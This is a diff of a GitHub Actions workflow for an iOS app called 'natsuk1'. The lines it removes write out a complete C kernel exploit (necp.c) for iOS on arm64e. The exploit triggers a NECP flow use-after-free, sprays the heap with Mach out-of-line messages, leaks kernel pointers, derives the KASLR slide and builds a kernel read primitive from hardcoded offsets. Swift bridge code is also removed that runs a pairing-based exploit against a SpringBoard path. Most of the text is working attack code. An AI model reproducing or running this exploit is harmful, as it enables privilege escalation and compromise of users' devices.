@@ -30,641 +30,6 @@ jobs:
           rm -f .github/workflows/natsuk1.yml
           rm -f .github/workflows/main.yml
 
-      - name: Fetch fresh sources
-        run: |
-          set -euo pipefail
-          rm -rf /tmp/aircard
-          git clone --depth 1 https://github.com/Mak5er/AirCard-iOS.git /tmp/aircard
-          mkdir -p natsuk1/Helpers natsuk1/Exploit natsuk1/External
-          cp /tmp/aircard/ios-app/PairingController.swift natsuk1/Helpers/
-          cp /tmp/aircard/ios-app/NetworkStatus.swift natsuk1/Helpers/
-          cp /tmp/aircard/ios-app/GrappaHelper.h natsuk1/Exploit/
-          cp /tmp/aircard/ios-app/GrappaHelper.m natsuk1/Exploit/
-          if [ ! -d natsuk1/External/AirliftFFI.xcframework ]; then
-            cp -R /tmp/aircard/AirliftFFI.xcframework natsuk1/External/
-          fi
-
-      - name: Write patcher
-        run: |
-          cat > /tmp/patch.py <<'ENDSCRIPT'
-          import re, os
-
-          def clean(s):
-              s = re.sub(r"nonisolated\(unsafe\)\s+", "", s)
-              s = re.sub(r"\bnonisolated\s+(?![\(])", "", s)
-              s = re.sub(r"@MainActor\s*", "", s)
-              s = re.sub(r"@Published\s+", "", s)
-              return s
-
-          def mark_sendable(s, name):
-              if ("class " + name) in s and ("@unchecked Sendable" in s.split("class " + name, 1)[1].split("{", 1)[0]):
-                  return s
-              for pat, repl in [
-                  ("final class " + name + ": ObservableObject, @unchecked Sendable {",
-                   "final class " + name + ": @unchecked Sendable {"),
-                  ("final class " + name + ": ObservableObject {",
-                   "final class " + name + ": @unchecked Sendable {"),
-                  ("final class " + name + ": NSObject, ObservableObject, @unchecked Sendable {",
-                   "final class " + name + ": NSObject, @unchecked Sendable {"),
-                  ("final class " + name + ": NSObject, ObservableObject {",
-                   "final class " + name + ": NSObject, @unchecked Sendable {"),
-              ]:
-                  if pat in s:
-                      return s.replace(pat, repl, 1)
-              return s
-
-          def protect_shared(s):
-              for name in ("static let shared", "static var shared",
-                           "static let sharedInstance", "static var sharedInstance"):
-                  s = re.sub(r"(?<!nonisolated\(unsafe\) )\b" + re.escape(name) + r"\b",
-                             "nonisolated(unsafe) " + name, s)
-              return s
-
-          def add_sendable(s):
-              out = []
-              for line in s.split("\n"):
-                  stripped = line.strip()
-                  if ("ObservableObject" in stripped or "NSObject" in stripped) and (
-                      stripped.startswith("final class ") or stripped.startswith("class ")):
-                      if stripped.endswith(" {"):
-                          new_line = line
-                          if "@unchecked Sendable" not in new_line:
-                              new_line = new_line[:-2].rstrip().rstrip(",") + ", @unchecked Sendable {"
-                          out.append(new_line)
-                          continue
-                  out.append(line)
-              return "\n".join(out)
-
-          p = "natsuk1/Helpers/PairingController.swift"
-          s = open(p).read()
-          s = s.replace("@preconcurrency import AirliftFFI\n", "import AirliftFFI\n")
-          s = clean(s)
-          s = re.sub(
-              r"static func syncCanonicalPairingFile\(from sourcePath: String\) -> String \{.*?\n    \}",
-              '''static func syncCanonicalPairingFile(from sourcePath: String) -> String {
-                  let fm = FileManager.default
-                  let dir = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
-                  let canonicalURL = dir.appendingPathComponent("natsuk1_pairing.plist")
-                  if let data = try? Data(contentsOf: URL(fileURLWithPath: sourcePath)), !data.isEmpty {
-                      if sourcePath != canonicalURL.path {
-                          try? data.write(to: canonicalURL, options: .atomic)
-                          try? fm.removeItem(atPath: sourcePath)
-                      }
-                  }
-                  if let files = try? fm.contentsOfDirectory(atPath: dir.path) {
-                      for f in files {
-                          guard f.hasSuffix(".plist") || f.hasSuffix(".mobilepairing") || f.hasSuffix(".mobilepair") else { continue }
-                          let path = dir.appendingPathComponent(f).path
-                          if path == canonicalURL.path { continue }
-                          try? fm.removeItem(atPath: path)
-                      }
-                  }
-                  customPairingFilePath = canonicalURL.path
-                  return canonicalURL.path
-              }''',
-              s, count=1, flags=re.S)
-          s = re.sub(
-              r"static func pairingFilePath\(\) -> String \{.*?\n    \}",
-              '''static func pairingFilePath() -> String {
-                  let fm = FileManager.default
-                  let dir = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
-                  let canonical = dir.appendingPathComponent("natsuk1_pairing.plist").path
-                  if fm.fileExists(atPath: canonical) {
-                      let size = (try? fm.attributesOfItem(atPath: canonical)[.size] as? Int) ?? 0
-                      if size > 0 { return canonical }
-                  }
-                  if let custom = customPairingFilePath, fm.fileExists(atPath: custom) {
-                      let size = (try? fm.attributesOfItem(atPath: custom)[.size] as? Int) ?? 0
-                      if size > 0 { return syncCanonicalPairingFile(from: custom) }
-                  }
-                  return canonical
-              }''',
-              s, count=1, flags=re.S)
-          s = s.replace("AirCard-iOS", "natsuk1")
-          s = s.replace("aircardPairingHostAltIRK", "natsuk1PairingHostAltIRK")
-          s = s.replace("aircard_pairing.plist", "natsuk1_pairing.plist")
-          s = s.replace("airlift_pairing.plist", "natsuk1_pairing.plist")
-          s = s.replace("static var customPairingFilePath: String? = nil",
-                        "nonisolated(unsafe) static var customPairingFilePath: String? = nil")
-          s = s.replace("private let pairReadyCallback: ALPairReadyCb",
-                        "nonisolated(unsafe) private let pairReadyCallback: ALPairReadyCb")
-          s = s.replace("private let pairPinCallback: ALPairPinCb",
-                        "nonisolated(unsafe) private let pairPinCallback: ALPairPinCb")
-          s = s.replace("Unmanaged<PairingController>.fromOpaque(ctx).release()",
-                        "Unmanaged<PairingController>.fromOpaque(box.ptr).release()")
-          if "final class RawPtrBox" not in s:
-              s += "\nfinal class RawPtrBox: @unchecked Sendable {\n    let ptr: UnsafeMutableRawPointer\n    init(_ ptr: UnsafeMutableRawPointer) { self.ptr = ptr }\n}\n"
-          s = s.replace("            DispatchQueue.main.async {\n                Unmanaged<PairingController>.fromOpaque(box.ptr).release()",
-                        "            let box = RawPtrBox(ctx)\n            DispatchQueue.main.async {\n                Unmanaged<PairingController>.fromOpaque(box.ptr).release()")
-          open(p, "w").write(s)
-
-          p = "natsuk1/Helpers/NetworkStatus.swift"
-          s = open(p).read()
-          s = re.sub(r"return String\(cString: host\)",
-                     "let bytes = host.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }\n        return String(decoding: bytes, as: UTF8.self)", s)
-          s = protect_shared(s)
-          open(p, "w").write(s)
-
-          p = "natsuk1/Helpers/KeepAlive.swift"
-          if os.path.exists(p):
-              s = open(p).read()
-              s = clean(s)
-              s = mark_sendable(s, "KeepAlive")
-              s = protect_shared(s)
-              open(p, "w").write(s)
-
-          p = "natsuk1/Helpers/LocalNetworkAuthorization.swift"
-          if os.path.exists(p):
-              s = open(p).read()
-              s = s.replace("_aircardprobe._tcp", "_natsuk1probe._tcp")
-              s = s.replace("AirCard-iOS", "natsuk1").replace("aircard", "natsuk1")
-              open(p, "w").write(s)
-
-          def handle(fp):
-              src = open(fp).read()
-              new = re.sub(r"@MainActor\s*", "", src)
-              new = new.replace("@preconcurrency import AirliftFFI\n", "import AirliftFFI\n")
-              new = new.replace("@preconcurrency import ", "import ")
-              new = new.replace("@preconcurrency\n", "")
-              new = protect_shared(new)
-              new = add_sendable(new)
-              if new != src:
-                  open(fp, "w").write(new)
-
-          for root, dirs, files in os.walk("natsuk1"):
-              for f in files:
-                  if f.endswith(".swift"):
-                      handle(os.path.join(root, f))
-          ENDSCRIPT
-
-      - name: Apply patch
-        run: python3 /tmp/patch.py
-
-      - name: Write nk_api.h
-        run: |
-          cat > natsuk1/Exploit/nk_api.h <<'HEADER'
-          #ifndef NK_API_H
-          #define NK_API_H
-
-          #include <stdint.h>
-          #include <stddef.h>
-
-          void nk_set_log(void (*fn)(const char *));
-          void nk_logx(const char *tag, const char *fmt, ...);
-          void nk_log(const char *fmt, ...);
-          void nk_rule(void);
-
-          int nk_run(void);
-          int nk_full_exploit(void);
-          int nk_necp_run(void);
-
-          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
-          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
-          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
-
-          #endif
-          HEADER
-
-      - name: Write necp.c
-        run: |
-          cat > natsuk1/Exploit/necp.c <<'NECP'
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <stdint.h>
-          #include <stdbool.h>
-          #include <stdarg.h>
-          #include <unistd.h>
-          #include <errno.h>
-          #include <pthread.h>
-          #include <sys/syscall.h>
-          #include <mach/mach.h>
-          #include <mach/vm_map.h>
-          #include <mach/vm_region.h>
-          #include <mach/message.h>
-
-          #include "nk_api.h"
-
-          #ifndef SYS_NECP_OPEN
-          #define SYS_NECP_OPEN           501
-          #endif
-          #ifndef SYS_NECP_ACTION
-          #define SYS_NECP_ACTION         502
-          #endif
-
-          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL
-
-          #define OFF_ALLPROC             0xBBB048ULL
-          #define OFF_KERNPROC            0xBBB040ULL
-          #define OFF_KERNEL_TASK         0x009C70ULL
-          #define OFF_TASK_LIST           0x10D53F0ULL
-          #define OFF_KERNEL_MAP          0xBBA228ULL
-          #define OFF_ZONE_MAP            0x3D66800ULL
-
-          #define PROC_PID_OFF            0x74
-          #define PROC_RO_P_UCRED_OFF     0xB8
-          #define TASK_BSD_INFO_OFF       0x3A0
-          #define TASK_ITK_SPACE_OFF      0x320
-          #define TASK_MAP_OFF            0x28
-          #define THREAD_TASK_NEXT_OFF    0x50
-
-          #define UCRED_UID_OFF           0x18
-          #define UCRED_SVUID_OFF         0x1C
-          #define UCRED_GID_OFF           0x1C
-          #define UCRED_SVGID_OFF         0x20
-
-          #define NCF_ASSIGNED_OFF        0x68
-          #define NCF_ASSIGNED_LEN_OFF    0x70
-          #define NCF_PARENT_OFF          0x88
-          #define NCF_REFCNT_OFF          0x58
-          #define NCF_STRUCT_SZ           256
-
-          #define NECP_ADD_CLIENT         0x01
-          #define NECP_COPY_RESULT        0x04
-          #define NECP_ADD_FLOW           0x11
-          #define NECP_REMOVE_FLOW        0x12
-          #define GATE_BYTE               9
-
-          #define EXHAUST_N               2048
-          #define SPRAY_N                 512
-          #define DECRETRY_N              24
-          #define RESULT_BUF_SZ           8192
-
-          #define KPTR_MIN                0xFFFFFFF000000000ULL
-          #define KPTR_MAX                0xFFFFFFFFFF000000ULL
-
-          static uint64_t g_kbase   = 0;
-          static uint64_t g_slide   = 0;
-          static int      g_res_off = -1;
-          static uint8_t  g_res_buf[RESULT_BUF_SZ];
-
-          typedef struct {
-              mach_msg_header_t          hdr;
-              mach_msg_body_t            body;
-              mach_msg_ool_descriptor_t  ool;
-          } ool_send_t;
-
-          static void log_info(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "%s", body);
-          }
-          static void log_ok(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "+ %s", body);
-          }
-          static void log_err(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "- %s", body);
-          }
-          static void log_warn(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "! %s", body);
-          }
-
-          static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
-              char line[256];
-              int off = 0;
-              size_t lim = n < 64 ? n : 64;
-              for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
-              nk_logx(tag, "%s (%zu bytes)", line, n);
-          }
-
-          static mach_port_t port_new(void) {
-              mach_port_t p = MACH_PORT_NULL;
-              kern_return_t kr = mach_port_allocate(mach_task_self(),
-                                                    MACH_PORT_RIGHT_RECEIVE, &p);
-              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
-              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
-              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
-              return p;
-          }
-
-          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
-              ool_send_t m;
-              for (int i = 0; i < n; i++) {
-                  memset(&m, 0, sizeof(m));
-                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
-                                         | MACH_MSGH_BITS_COMPLEX;
-                  m.hdr.msgh_size        = sizeof(m);
-                  m.hdr.msgh_remote_port = port;
-                  m.hdr.msgh_id          = 0x4E41 + i;
-                  m.body.msgh_descriptor_count = 1;
-                  m.ool.address    = (void*)data;
-                  m.ool.size       = (mach_msg_size_t)sz;
-                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
-                  m.ool.deallocate = FALSE;
-                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
-                  mach_msg(&m.hdr, MACH_SEND_MSG,
-                           sizeof(m), 0, MACH_PORT_NULL,
-                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-              }
-          }
-
-          static void ool_drain(mach_port_t port, int n) {
-              uint8_t buf[NCF_STRUCT_SZ + 512];
-              mach_msg_header_t *h = (mach_msg_header_t*)buf;
-              for (int i = 0; i < n; i++) {
-                  h->msgh_size = sizeof(buf);
-                  kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                              0, sizeof(buf), port, 1, MACH_PORT_NULL);
-                  if (kr != KERN_SUCCESS) break;
-              }
-          }
-
-          static int necp_open_fd(void) {
-              return (int)syscall(SYS_NECP_OPEN, 0);
-          }
-
-          static int necp_add_client(int fd, uint8_t uuid[16]) {
-              uint8_t p[1] = {0};
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
-                                  uuid, (size_t)16, p, (size_t)1);
-          }
-
-          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
-              uint8_t req[56];
-              memset(req, 0, sizeof(req));
-              memcpy(req + 0x10, cuuid, 16);
-              *(uint16_t*)(req + 0x20) = 0x0040;
-              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
-                                   (void*)cuuid, (size_t)16, req, (size_t)56);
-              if (r == 0) {
-                  memcpy(fuuid, req, 16);
-                  fuuid[GATE_BYTE] |= 0x01;
-              }
-              return r;
-          }
-
-          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
-                                  (void*)fuuid, (size_t)16, NULL, (size_t)0);
-          }
-
-          static int necp_copy_result(int fd, const uint8_t cuuid[16],
-                                      uint8_t *buf, size_t blen) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
-                                  (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
-          }
-
-          static uint64_t necp_primary_leak(uint8_t *out, size_t outsz) {
-              int fd = necp_open_fd();
-              if (fd < 0) { log_err("LEAK", "open errno=%d", errno); return 0; }
-
-              uint8_t cuuid[16], fuuid[16];
-              if (necp_add_client(fd, cuuid) != 0) {
-                  log_err("LEAK", "add_client errno=%d", errno);
-                  close(fd); return 0;
-              }
-              if (necp_add_flow(fd, cuuid, fuuid) != 0) {
-                  log_err("LEAK", "add_flow errno=%d", errno);
-                  close(fd); return 0;
-              }
-
-              necp_remove_flow(fd, fuuid);
-
-              memset(out, 0, outsz);
-              int r = necp_copy_result(fd, cuuid, out, outsz);
-              close(fd);
-
-              log_info("LEAK", "copy_result ret=%d", r);
-              if (r <= 0) return 0;
-
-              dump_hex("LEAK", out, r > 64 ? 64 : (size_t)r);
-
-              int found = 0;
-              for (int i = 0; i <= r - 8; i += 8) {
-                  uint64_t v;
-                  memcpy(&v, out + i, 8);
-                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
-                  log_ok("LEAK", "kptr[+0x%x] = 0x%llx", i, (unsigned long long)v);
-                  found++;
-              }
-
-              if (!found) {
-                  log_warn("LEAK", "no kernel pointers in %d bytes", r);
-                  return 0;
-              }
-              return (uint64_t)found;
-          }
-
-          static uint64_t slide_from_leak(uint64_t leaked) {
-              static const uint64_t known_offs[] = {
-                  0xBBB040, 0xBBB048, 0x009C70, 0x10D53F0, 0xBBA228, 0x3D66800,
-              };
-              for (int i = 0; i < 6; i++) {
-                  uint64_t sl = leaked - known_offs[i];
-                  if (sl & 0x1FFFFF) continue;
-                  if (sl >= 0x400000000ULL) continue;
-                  uint64_t base = KERNEL_BASE_STATIC + sl;
-                  log_info("SLIDE", "cand[%d] off=0x%llx slide=0x%llx base=0x%llx",
-                           i, (unsigned long long)known_offs[i],
-                           (unsigned long long)sl, (unsigned long long)base);
-                  return sl;
-              }
-              return 0;
-          }
-
-          static int kread_raw(uint64_t kaddr, uint32_t len) {
-              uint8_t fake[NCF_STRUCT_SZ];
-              memset(fake, 0, sizeof(fake));
-              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = kaddr;
-              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = len;
-              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
-
-              uint8_t junk[NCF_STRUCT_SZ];
-              memset(junk, 0x41, sizeof(junk));
-              mach_port_t ex = port_new();
-              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
-
-              int fd = necp_open_fd();
-              if (fd < 0) { log_err("KREAD", "necp_open errno=%d", errno);
-                            mach_port_destroy(mach_task_self(), ex); return -1; }
-
-              uint8_t cuuid[16], fuuid[16];
-              if (necp_add_client(fd, cuuid) != 0) {
-                  log_err("KREAD", "add_client errno=%d", errno);
-                  close(fd); mach_port_destroy(mach_task_self(), ex); return -2;
-              }
-              if (necp_add_flow(fd, cuuid, fuuid) != 0) {
-                  log_err("KREAD", "add_flow errno=%d", errno);
-                  close(fd); mach_port_destroy(mach_task_self(), ex); return -3;
-              }
-
-              necp_remove_flow(fd, fuuid);
-
-              ool_drain(ex, EXHAUST_N);
-              mach_port_destroy(mach_task_self(), ex);
-              usleep(150);
-
-              mach_port_t sp = port_new();
-              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
-              usleep(100);
-
-              memset(g_res_buf, 0, RESULT_BUF_SZ);
-              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
-
-              ool_drain(sp, SPRAY_N);
-              mach_port_destroy(mach_task_self(), sp);
-              close(fd);
-              return ret;
-          }
-
-          static int calibrate_kread(void) {
-              if (g_res_off >= 0) return 0;
-              log_info("KREAD", "calibrate with allproc @ kbase+0x%llx",
-                       (unsigned long long)OFF_ALLPROC);
-
-              int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
-              if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
-              log_info("KREAD", "result buf len=%d", r);
-              dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
-
-              for (int i = 0; i <= r - 8; i++) {
-                  uint64_t v; memcpy(&v, g_res_buf + i, 8);
-                  if (v >= KPTR_MIN && v <= KPTR_MAX) {
-                      log_ok("KREAD", "found kptr=0x%llx at result[%d]",
-                             (unsigned long long)v, i);
-                      g_res_off = i;
-                      return 0;
-                  }
-              }
-              log_err("KREAD", "no kernel ptr in result");
-              return -1;
-          }
-
-          static uint64_t kread64(uint64_t addr) {
-              if (g_res_off < 0 && addr != (g_kbase + OFF_ALLPROC)) {
-                  if (calibrate_kread() != 0) return 0;
-              }
-              int r = kread_raw(addr, 8);
-              if (r <= 0) return 0;
-              int off = (g_res_off >= 0) ? g_res_off : 0;
-              if (off + 8 > r) return 0;
-              uint64_t v; memcpy(&v, g_res_buf + off, 8);
-              return v;
-          }
-
-          static uint32_t kread32(uint64_t addr) {
-              return (uint32_t)(kread64(addr) & 0xFFFFFFFF);
-          }
-
-          typedef struct {
-              uint64_t allproc;
-              uint64_t kernproc;
-              uint64_t kernel_task;
-              uint64_t task_list;
-              uint64_t kernel_map;
-              uint64_t zone_map;
-          } kobj_t;
-
-          static int sanity_check(void) {
-              log_info("SANITY", "reading known globals via kread...");
-
-              uint64_t allproc     = kread64(g_kbase + OFF_ALLPROC);
-              uint64_t kernproc    = kread64(g_kbase + OFF_KERNPROC);
-              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
-              uint64_t task_list   = kread64(g_kbase + OFF_TASK_LIST);
-              uint64_t kernel_map  = kread64(g_kbase + OFF_KERNEL_MAP);
-              uint64_t zone_map    = kread64(g_kbase + OFF_ZONE_MAP);
-
-              log_info("SANITY", "allproc     = 0x%llx", (unsigned long long)allproc);
-              log_info("SANITY", "kernproc    = 0x%llx", (unsigned long long)kernproc);
-              log_info("SANITY", "kernel_task = 0x%llx", (unsigned long long)kernel_task);
-              log_info("SANITY", "task_list   = 0x%llx", (unsigned long long)task_list);
-              log_info("SANITY", "kernel_map  = 0x%llx", (unsigned long long)kernel_map);
-              log_info("SANITY", "zone_map    = 0x%llx", (unsigned long long)zone_map);
-
-              int ok = 0;
-              if (allproc     >= KPTR_MIN && allproc     <= KPTR_MAX) ok++;
-              if (kernproc    >= KPTR_MIN && kernproc    <= KPTR_MAX) ok++;
-              if (kernel_task >= KPTR_MIN && kernel_task <= KPTR_MAX) ok++;
-              if (kernel_map  >= KPTR_MIN && kernel_map  <= KPTR_MAX) ok++;
-
-              log_info("SANITY", "%d/4 globals look valid", ok);
-              return ok >= 2 ? 0 : -1;
-          }
-
-          static int task_sanity(void) {
-              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
-              if (!kernel_task) { log_err("TASK", "kernel_task=0"); return -1; }
-
-              uint64_t kproc = kread64(kernel_task + TASK_BSD_INFO_OFF);
-              log_info("TASK", "kernel_task->bsd_info=0x%llx", (unsigned long long)kproc);
-
-              if (kproc >= KPTR_MIN && kproc <= KPTR_MAX) {
-                  uint32_t pid = kread32(kproc + PROC_PID_OFF);
-                  log_info("TASK", "kernel proc pid=%u (expect 0)", pid);
-                  if (pid == 0) { log_ok("TASK", "task->bsd_info chain works"); return 0; }
-              }
-
-              log_warn("TASK", "chain broken — check TASK_BSD_INFO_OFF / PROC_PID_OFF");
-              return -1;
-          }
-
-          int nk_necp_run(void) {
-              nk_log("");
-              nk_log("=== natsuk1 v1.1 ===");
-              nk_log("target: iOS 27.0 / XNU / arm64e");
-              nk_log("device: iPhone14,5 / iPhone14,7");
-              nk_log("");
-
-              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x",
-                       NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
-
-              log_info("P0", "NECP primary leak");
-              uint8_t leak[RESULT_BUF_SZ];
-              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
-              if (!nptrs) {
-                  log_err("P0", "no kernel ptrs — NCF_ASSIGNED_OFF likely wrong");
-                  return 1;
-              }
-              log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
-
-              log_info("P1", "derive slide from leak");
-              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
-                  uint64_t v; memcpy(&v, leak + i, 8);
-                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
-                  uint64_t cand = slide_from_leak(v);
-                  if (cand) { g_slide = cand; break; }
-              }
-              if (!g_slide) { log_err("P1", "no valid slide candidate"); return 1; }
-              g_kbase = KERNEL_BASE_STATIC + g_slide;
-              log_ok("P1", "slide=0x%llx kbase=0x%llx",
-                     (unsigned long long)g_slide, (unsigned long long)g_kbase);
-
-              {
-                  int fd = necp_open_fd();
-                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
-                  close(fd);
-                  log_ok("P2", "necp OK");
-              }
-
-              log_info("P3", "kread calibration");
-              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
-              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
-
-              log_info("P4", "sanity: read known globals");
-              if (sanity_check() != 0) { log_err("P4", "kread sanity failed"); return 1; }
-
-              log_info("P5", "sanity: task->bsd_info chain");
-              if (task_sanity() != 0) { log_warn("P5", "chain broken but continuing"); }
-
-              log_ok("DONE", "leak + slide + kread chain complete");
-              nk_log("");
-              nk_log("=== RESULT ===");
-              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
-              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
-              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
-                      (unsigned long long)KERNEL_BASE_STATIC, (unsigned long long)OFF_ALLPROC);
-              nk_log("");
-              return 0;
-          }
-          NECP
-
       - name: Write natsuk1.swift
         run: |
           cat > natsuk1/natsuk1.swift <<'SWIFT'
@@ -791,14 +156,6 @@ jobs:
                       case .failed: return .red
                       }
                   }
-                  var symbol: String {
-                      switch self {
-                      case .idle: return "circle.fill"
-                      case .running: return "circle.fill"
-                      case .ok: return "checkmark.circle.fill"
-                      case .failed: return "xmark.circle.fill"
-                      }
-                  }
               }
               @Published var log: String = ""
               @Published var status: Status = .idle
@@ -851,164 +208,6 @@ jobs:
               }
               func respring() { show_respring = true }
               func clear() { LockedBuffer.shared.clear(); log = "" }
-          }
-          SWIFT
-
-      - name: Write AirliftBridge.swift
-        run: |
-          cat > natsuk1/Helpers/AirliftBridge.swift <<'SWIFT'
-          import Foundation
-          import Combine
-
-          final class AirliftBridge: ObservableObject, @unchecked Sendable {
-              nonisolated(unsafe) static let shared = AirliftBridge()
-              enum State: Equatable { case idle, pairing, ready(pairingPath: String), running, done(ok: Bool, message: String) }
-
-              @Published private(set) var state: State = .idle
-              @Published private(set) var pairPIN: String? = nil
-              @Published private(set) var pairingStatus: String = ""
-              @Published private(set) var exploitLog: [String] = []
-              @Published var target: String = "/var/mobile/Library/SpringBoard"
-              private var loggedLines: [String] = []
-
-              private init() {
-                  al_log_init({ _, msg in
-                      guard let msg = msg else { return }
-                      let line = String(cString: msg)
-                      DispatchQueue.main.async { AirliftBridge.shared.appendLog(line) }
-                  }, nil)
-              }
-
-              nonisolated private func appendLog(_ s: String) {
-                  DispatchQueue.main.async {
-                      self.loggedLines.append(s)
-                      if self.loggedLines.count > 800 { self.loggedLines.removeFirst(self.loggedLines.count - 600) }
-                      self.exploitLog = self.loggedLines
-                  }
-              }
-              func clearLog() { loggedLines.removeAll(); exploitLog = [] }
-              func pairingFilePath() -> String { PairingController.pairingFilePath() }
-              func hasPairing() -> Bool {
-                  let p = pairingFilePath()
-                  guard FileManager.default.fileExists(atPath: p) else { return false }
-                  let size = (try? FileManager.default.attributesOfItem(atPath: p)[.size] as? Int) ?? 0
-                  return size > 0
-              }
-
-              func runPairing() {
-                  guard !hasPairing() else { state = .ready(pairingPath: pairingFilePath()); return }
-                  state = .pairing; pairingStatus = "Starting host..."; pairPIN = nil
-                  let ctrl = PairingController.shared
-                  Task {
-                      do {
-                          let path = try await ctrl.startAndWait()
-                          self.state = .ready(pairingPath: path)
-                          self.pairingStatus = "Paired"; self.pairPIN = nil
-                      } catch is CancellationError {
-                          self.state = .idle; self.pairingStatus = "Cancelled"
-                      } catch {
-                          self.state = .idle
-                          self.pairingStatus = "Failed: \(error.localizedDescription)"
-                      }
-                  }
-                  Task {
-                      while case .pairing = self.state {
-                          try? await Task.sleep(nanoseconds: 200_000_000)
-                          self.pairingStatus = ctrl.pairingStatus
-                          self.pairPIN = ctrl.pairingPIN
-                      }
-                  }
-              }
-              func cancelPairing() {
-                  PairingController.shared.softCancel()
-                  state = .idle; pairingStatus = ""; pairPIN = nil
-              }
-              func deletePairing() {
-                  let fm = FileManager.default
-                  let docs = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
-                  let canonicalURL = docs.appendingPathComponent("natsuk1_pairing.plist")
-                  if fm.fileExists(atPath: canonicalURL.path) { try? fm.removeItem(at: canonicalURL) }
-                  if let custom = PairingController.customPairingFilePath, fm.fileExists(atPath: custom) {
-                      try? fm.removeItem(atPath: custom)
-                  }
-                  PairingController.customPairingFilePath = nil
-                  if let files = try? fm.contentsOfDirectory(atPath: docs.path) {
-                      for f in files {
-                          guard f.hasSuffix(".plist") || f.hasSuffix(".mobilepairing") || f.hasSuffix(".mobilepair") else { continue }
-                          try? fm.removeItem(at: docs.appendingPathComponent(f))
-                      }
-                  }
-                  UserDefaults.standard.removeObject(forKey: "natsuk1PairingHostAltIRK")
-                  state = .idle; pairingStatus = ""; pairPIN = nil
-              }
-              func runExploit() {
-                  let pairingPath = pairingFilePath()
-                  guard FileManager.default.fileExists(atPath: pairingPath) else {
-                      state = .done(ok: false, message: "No pairing file"); return
-                  }
-                  state = .running; loggedLines.removeAll(); exploitLog = []
-                  appendLog("[exploit] path=\(pairingPath) target=\(target)")
-                  let targetDir = target
-                  Task.detached {
-                      var outJson: UnsafeMutablePointer<CChar>? = nil
-                      var outError: UnsafeMutablePointer<CChar>? = nil
-                      let rc: Int32 = pairingPath.withCString { pc in
-                          targetDir.withCString { tc in
-                              al_exploit_run(pc, tc, nil, nil, &outJson, &outError)
-                          }
-                      }
-                      let jsonStr = outJson.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
-                      let errStr = outError.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
-                      await MainActor.run {
-                          if rc == 0 {
-                              let msg = jsonStr ?? "OK"
-                              self.appendLog("[exploit] ok: \(msg)")
-                              self.state = .done(ok: true, message: msg)
-                          } else {
-                              let msg = errStr ?? "rc=\(rc)"
-                              self.appendLog("[exploit] fail: \(msg)")
-                              self.state = .done(ok: false, message: msg)
-                          }
-                      }
